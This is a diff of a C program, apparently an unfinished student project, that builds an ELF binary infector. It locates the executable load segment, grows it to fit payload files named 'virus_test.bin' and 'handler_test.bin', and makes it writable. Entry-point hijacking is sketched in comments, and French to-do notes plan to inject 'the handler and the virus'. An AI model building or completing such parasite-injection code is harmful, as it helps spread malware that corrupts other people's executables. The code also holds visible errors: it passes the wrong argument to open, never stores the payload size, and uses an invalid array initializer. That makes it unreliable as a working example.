@@ -9,27 +9,52 @@
 #include <errno.h>
 #include <fcntl.h>
 
-int64_t set_payload_size(char *path)
+static Elf64_Addr   g_old_addr;   
+static Elf64_Addr   g_parasite_addr;
+static Elf64_Off    g_parasite_off;
+static uint64_t     g_parasite_size;
+static uint64_t     g_payload_size;
+
+void calcul_payload(char **paths)
 {
-    int fd = open(path, O_RDONLY);
-    if(fd < 0)
-        return(printf("Error, the source assembly file is not accesible\n"), 0);
-    int64_t size = (int64_t)lseek(fd, 0, SEEK_END);
-    if(size == -1)
-        return(printf("Error, lseek function return an error\n"), 0);
-    close(fd);
-    return(size);
+    int64_t size = 0;
+    int verif = 0;
+    for (int i = 0; paths[i]; i++)
+    {
+        int fd = open(paths, O_RDONLY);
+        if(fd < 0)
+        {
+            close(fd);
+            printf("Error, the source assembly file is not accesible\n");
+            return ;
+        }
+        verif = (int64_t)lseek(fd, 0, SEEK_END);
+        if(verif == -1)
+        {
+            close(fd);
+            printf("Error, lseek function return an error\n");
+            return ;
+        }
+        else
+            size += verif;
+        close(fd);
+    }
+    return ;
 }
 
 int main(int argc, char **argv)
 {
+    uint64_t seg_size = 0;
+    Elf64_Addr seg_addr = 0;
+    Elf64_Off seg_offset = 0;
     if(argc < 2)
         return (printf("ERROR, not enought argument\n"), 1);
     int fd = open(argv[1], O_RDWR);
     if(fd < -1)
         return(printf("Error while opening the file\n"), 1);
-    uint64_t payload_size = set_payload_size("virus_test.bin");
-    if(!payload_size)
+    char **paths = {"virus_test.bin", "handler_test.bin"};
+    calcul_payload(paths);
+    if(!g_payload_size)
         return(printf("Error, payload issue\n"), 1);
     struct stat st;
     fstat(fd, &st);
@@ -42,32 +67,44 @@ int main(int argc, char **argv)
     { 
         if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_X))
         {
-            uint64_t seg_size = phdr[i].p_filesz;
-            Elf64_Addr seg_addr = phdr[i].p_vaddr;
-            Elf64_Off seg_offset = phdr[i].p_offset;
+            seg_size = phdr[i].p_filesz;
+            seg_addr = phdr[i].p_vaddr;
+            seg_offset = phdr[i].p_offset;
 
             if(i < eh->e_phnum)
                 padding = phdr[i + 1].p_offset - (seg_offset + seg_size);
-            if(padding < payload_size)
+            if(padding < g_payload_size)
                 return(printf("Error, not possible to inject the code because not enought space\n"), 1);
             else
             {
                 printf("Ajusting the size to fill\n");
-                phdr[i].p_filesz += payload_size;
-                phdr[i].p_memsz += payload_size;
+                phdr[i].p_filesz += g_payload_size;
+                phdr[i].p_memsz += g_payload_size;
                 phdr[i].p_flags |= PF_W;
             }
             break;
         }
     }
+    g_parasite_addr = seg_addr + seg_size;
+    g_parasite_off = seg_offset + seg_size;
+    
+    // Changer l'entry point //
+    //Elf64_Addr old_entry = eh->e_entry;
+    //if(eh->e_type == ET_EXEC)
+    //{
+    //    eh->e_entry = g_handler_addr; // ?
+    //}
+    //else
+    //{
+    //    eh->e_entry = g_handler_off; // ?
+    //}
     return(0);
 }
 
-// J'ai initialiser les variables,
-// Rechercher la partie qui est le segment qui est injectable
-// Ajuster la taille des donnees du segment pour preparer le payload a y etre injecter 
-
-// Il faut encore faire l'injection et je crois c'est tout non ? 
+// Faire le handler.s
+// Redefinir le payload size
+// Redefinir le entry_point
+// Injecter le handler et le virus
 
 
 
